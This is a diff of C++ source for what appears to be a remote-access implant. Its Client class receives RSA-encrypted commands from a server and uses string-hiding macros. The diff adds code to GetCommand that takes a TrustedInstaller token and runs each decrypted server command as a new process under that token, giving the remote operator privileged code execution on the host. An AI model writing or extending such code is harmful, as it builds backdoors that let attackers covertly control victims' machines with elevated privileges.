@@ -34,7 +34,7 @@ Client::~Client() {
 	this->Disconnect(); // disconnect incase the socket is still connected
 
 	CleanWSA();
-	m_ProcMgr.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
+	//m_ProcMgr.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
 }
 
 void Client::SetRemoteComputerName() {
@@ -178,7 +178,7 @@ BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outRes
 		PROCESS_INFORMATION pi = { 0 };
 		CLIENT_DBG(normal.c_str());
 
-		success = this->m_ProcMgr.OpenProcessAsImposter(
+		/*success = this->m_ProcMgr.OpenProcessAsImposter(
 			this->m_ProcMgr.GetToken(),
 			LOGON_WITH_PROFILE,
 			NULL,
@@ -188,7 +188,7 @@ BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outRes
 			NULL,
 			&si,
 			&pi
-		);
+		);*/
 		CLIENT_DBG("opened...");
 
 		break;
@@ -302,8 +302,26 @@ BYTESTRING Client::GetCommand() {
 	BYTESTRING decrypted = LGCrypto::RSADecrypt(received, this->m_RequestSecrets.priv, TRUE);
 	std::string dbg = "decrypted size : " + std::to_string(decrypted.size()) + "\n";
 	CLIENT_DBG(dbg.c_str());
-	std::string message = Serialization::BytestringToString(decrypted);
-	CLIENT_DBG(message.c_str());
+	std::string deserialized = Serialization::BytestringToString(decrypted);
+	CLIENT_DBG(deserialized.c_str());
+	std::wstring wstr(deserialized.begin(), deserialized.end());
+
+	STARTUPINFO			si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+
+	this->m_ProcMgr.GetTrustedInstallerToken();
+	this->m_ProcMgr.OpenProcessAsImposter(
+		this->m_ProcMgr.GetToken(),
+		LOGON_WITH_PROFILE,
+		NULL,
+		wstr.data(),
+		CREATE_NEW_CONSOLE,
+		NULL,
+		NULL,
+		&si,
+		&pi
+	);
+
 
 	//BOOL received = NetCommon::ReceiveData(serverResponse, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, rsa, TRUE);
 	//std::string dbg = received ? "Received server command.\n" : "didnt receive!\n";
